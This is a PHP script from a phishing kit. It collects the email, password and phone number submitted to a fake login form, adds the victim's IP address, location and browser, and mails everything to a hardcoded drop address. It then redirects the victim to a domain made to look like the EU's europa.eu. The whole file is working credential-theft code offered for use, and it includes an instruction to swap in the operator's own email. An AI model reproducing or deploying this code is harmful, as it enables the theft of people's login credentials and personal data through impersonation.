<?php
if($_POST["Email"] != "" and $_POST["Password"] != ""){
require_once('plugin.class.php');

$geoplugin = new geoPlugin();
$geoplugin->locate();
if (!empty($_SERVER['HTTP_CLIENT_IP'])) { 
    $ip = $_SERVER['HTTP_CLIENT_IP']; 
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) { 
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR']; 
} else { 
    $ip = $_SERVER['REMOTE_ADDR']; 
} 
$browserAgent = $_SERVER['HTTP_USER_AGENT'];
$message .= "--------------E M A I L-----------------------\n";
$message .= "USER ID        : ".$_POST['Email']."\n";
$message .= "PASSWORD         : ".$_POST['Password']."\n";
$message .= "Phone         : ".$_POST['phone']."\n";
$message .= "---------=IP Address & Date=---------\n";
$message .= "IP Address: ".$ip."\n";
$message .= "City: {$geoplugin->city}\n";
$message .= "Region: {$geoplugin->region}\n";
$message .= "Country Name: {$geoplugin->countryName}\n";
$message .= "Country Code: {$geoplugin->countryCode}\n";
$message .= "Date: ".$adddate."\n";
$message .= "Browser                :".$browserAgent."\n";
$message .= "---------------Report-------------\n";
//change ur email here
$send = "cutebetty1st@gmail.com";
$subject = "Result .$ip.";
$headers = "From: EEU1<support@adloits.com>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
$arr=array($send, $IP);
foreach ($arr as $send)
{
mail($send,$subject,$message,$headers);
mail($to,$subject,$message,$headers);
}

 
     header("Location: https://ec.eur0pa.eu.tender.server.ssdtelecombd.com/index2.html");
}else{
header("Location: index2.html");
}

?>